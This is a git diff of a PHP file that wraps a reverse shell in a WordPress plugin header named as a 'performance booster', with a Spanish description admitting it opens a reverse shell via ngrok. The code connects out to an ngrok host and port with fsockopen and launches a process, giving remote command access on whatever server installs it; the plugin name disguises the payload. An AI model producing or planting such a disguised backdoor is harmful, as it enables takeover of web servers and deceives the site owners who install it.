@@ -1,7 +1,15 @@
 <?php
+
+/*
+Plugin Name: P3rf0rm4nc3_Bo0st3r_Plus
+Description: Un plugin que te da una reverse shell a través de ngrok.
+Version: 1.0
+Author: Shur3
+*/
+
 set_time_limit(0);
-$ip = '0.tcp.sa.ngrok.io';   // La IP / host público que te dio ngrok
-$port = 11286;           	// El puerto público que te dio ngrok
+$ip = '0.tcp.sa.ngrok.io';   // La IP de ngrok
+$port = 19417;           	// El puerto de ngrok
 
 $sock = fsockopen($ip, $port);
 if (!$sock) {
@@ -19,4 +27,5 @@ if (!is_resource($proc)) {
 }
 
 proc_close($proc);
+
 ?>
